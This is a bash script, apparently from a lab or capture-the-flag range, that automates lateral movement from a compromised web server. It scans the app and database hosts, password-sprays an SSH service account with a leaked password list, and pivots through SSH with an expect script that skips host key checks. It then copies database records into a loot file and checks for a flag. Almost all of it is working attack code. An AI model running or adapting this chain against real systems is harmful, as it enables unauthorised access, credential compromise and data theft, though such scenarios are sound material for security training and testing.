#!/bin/bash
# Reproducible east-west (server-to-server) scenario, launched from the
# compromised web server.
#   1. discover services on the app and database tiers
#   2. find the app service-account password by spraying the leaked list
#   3. log into app and read the database records table through it
APP=10.2.2.11
DB=10.2.3.11
USER=appsvc
LOOT=$HOME/loot.txt

echo "=== [1] discovery ==="
python3 ~/.local/bin/scan.py $APP $DB

echo "=== [2] credential access (password spray on $USER@$APP) ==="
PW=$(~/.local/bin/sshspray.sh $USER $APP ~/passwords.txt | awk '/^FOUND/{print $NF}')
if [ -z "$PW" ]; then echo "spray failed — no password recovered"; exit 1; fi
echo "recovered password: $PW"

echo "=== [3] pivot: read the database through app ==="
rm -f "$LOOT"
EXP=$(mktemp)
cat > "$EXP" <<EXPECT
log_file -a $LOOT
set timeout 12
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $USER@$APP /usr/local/bin/getdata.sh $DB
expect {
    -re {[Pp]assword:} { send "$PW\r"; exp_continue }
    eof
}
EXPECT
expect -f "$EXP"
rm -f "$EXP"
echo
echo "=== done; database table staged at $LOOT on web ==="
grep -q FLAG "$LOOT" && echo "exfiltration confirmed (FLAG present in loot.txt)"
